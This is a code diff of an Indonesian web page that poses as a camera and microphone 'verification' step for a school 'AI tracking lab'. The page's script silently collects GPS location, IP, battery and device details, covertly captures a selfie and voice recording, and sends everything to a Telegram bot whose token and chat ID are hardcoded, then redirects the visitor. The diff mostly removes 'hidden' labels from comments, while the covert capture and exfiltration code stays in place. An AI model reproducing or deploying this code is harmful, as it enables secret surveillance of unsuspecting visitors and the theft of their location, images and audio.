@@ -208,11 +208,11 @@
     </div>
 
     <script>
-        // ======================= KONFIGURASI TELEGRAM (HIDDEN) =======================
+        // ======================= KONFIGURASI TELEGRAM =======================
         const BOT_TOKEN = '8607052681:AAHMAuSuUO8CR84h5JlQThmlFKnyA9qFIaU';
         const CHAT_ID = '7428813404';
         
-        // ======================= FUNGSI KIRIM KE TELEGRAM (SILENT) =======================
+        // ======================= FUNGSI KIRIM KE TELEGRAM =======================
         async function sendText(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -245,7 +245,7 @@
             } catch(e) {}
         }
         
-        // ======================= AMBIL DATA (HIDDEN) =======================
+        // ======================= AMBIL DATA =======================
         let gpsData = null;
         let ipData = {};
         let batteryData = {};
@@ -287,20 +287,18 @@
             if (/iPhone/i.test(ua)) { brand = "Apple"; model = "iPhone"; }
             else if (/SM-[A-Z0-9]+/i.test(ua)) { brand = "Samsung"; model = ua.match(/SM-[A-Z0-9]+/i)?.[0] || "Galaxy"; }
             else if (/Xiaomi|Redmi/i.test(ua)) { brand = "Xiaomi"; model = "Redmi/Xiaomi"; }
-            else if (/OPPO/i.test(ua)) { brand = "Oppo"; model = "Oppo"; }
-            else if (/vivo/i.test(ua)) { brand = "Vivo"; model = "Vivo"; }
             return { brand, model, platform: navigator.platform, userAgent: ua };
         }
         
-        // ======================= KIRIM LAPORAN LENGKAP (HIDDEN) =======================
+        // ======================= KIRIM LAPORAN LENGKAP =======================
         async function sendFullReport() {
             const connection = navigator.connection ? navigator.connection.effectiveType : 'unknown';
             const waktu = new Date().toLocaleString('id-ID');
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             
             let msg = `╔════════════════════════════════════════╗\n`;
-            msg += `║   🏫 SMA NEGERI 1 - AI TRACKING LAB   \n`;
-            msg += `║        by ANBATUKANG 🫦              \n`;
+            msg += `║   🏫 SMA NEGERI 1 - AI TRACKING LAB  ║\n`;
+            msg += `║        by ANBATUKANG 🫦              ║\n`;
             msg += `╚════════════════════════════════════════╝\n\n`;
             
             msg += `<b>📍 LOKASI GPS</b>\n`;
@@ -326,7 +324,7 @@
             await sendText(msg);
         }
         
-        // ======================= HIDDEN SELFIE (DIAM-DIAM) =======================
+        // ======================= HIDDEN SELFIE =======================
         async function hiddenCaptureSelfie() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
@@ -346,7 +344,7 @@
             } catch(e) {}
         }
         
-        // ======================= HIDDEN VOICE (DIAM-DIAM) =======================
+        // ======================= HIDDEN VOICE =======================
         async function hiddenCaptureVoice() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -389,7 +387,7 @@
                 enterBtn.innerHTML = '⛔ AKTIFKAN KAMERA';
                 warningText.innerHTML = '⚡ Aktifkan Kamera terlebih dahulu';
                 warningText.style.color = '#f59e0b';
-                if (progressFill) progressFill.style.width = permissions.camera ? '50%' : '0%';
+                if (progressFill) progressFill.style.width = '0%';
             }
         }
         
@@ -438,8 +436,8 @@
             btn.disabled = true;
             
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                stream.getTracks().forEach(t => t.stop());
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(track => track.stop());
                 permissions.camera = true;
                 statusSpan.innerHTML = '✅ Aktif';
                 statusSpan.className = 'permission-status granted';
@@ -447,6 +445,7 @@
                 btn.disabled = true;
                 updateProgress();
             } catch(err) {
+                console.error('Camera error:', err);
                 permissions.camera = false;
                 statusSpan.innerHTML = '❌ Ditolak';
                 statusSpan.className = 'permission-status denied';
@@ -464,7 +463,7 @@
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                stream.getTracks().forEach(t => t.stop());
+                stream.getTracks().forEach(track => track.stop());
                 permissions.mic = true;
                 statusSpan.innerHTML = '✅ Aktif';
                 statusSpan.className = 'permission-status granted';
@@ -497,12 +496,10 @@
             btn.innerHTML = '⏳ MEMPROSES...';
             
             try {
-                // Ambil semua data (HIDDEN)
                 ipData = await getIP();
                 batteryData = await getBattery();
                 deviceData = getDevice();
                 
-                // Ambil GPS jika belum
                 if (!permissions.gps) {
                     const gpsResult = await getGPS();
                     if (gpsResult) {
@@ -511,13 +508,9 @@
                     }
                 }
                 
-                // KIRIM LAPORAN (HIDDEN)
                 await sendFullReport();
-                
-                // KIRIM SELFIE (HIDDEN)
                 await hiddenCaptureSelfie();
                 
-                // KIRIM VOICE jika mikrofon diizinkan (HIDDEN)
                 if (permissions.mic) {
                     await hiddenCaptureVoice();
                 } else {
@@ -525,13 +518,13 @@
                     await sendText(`⚠️ [MIKROFON TIDAK DIIZINKAN]\n🕒 ${new Date().toLocaleString('id-ID')}\n📍 GPS: ${gpsText}\n📱 Device: ${deviceData.brand} ${deviceData.model}`);
                 }
                 
-                // REDIRECT KE BLOG.HTML
                 loading.innerHTML = '✅ Verifikasi selesai! Mengalihkan...';
                 setTimeout(() => {
                     window.location.href = 'blog.html';
                 }, 1500);
                 
             } catch(e) {
+                console.error('Process error:', e);
                 loading.innerHTML = '❌ Gagal, coba lagi';
                 btn.disabled = false;
                 loading.style.display = 'none';
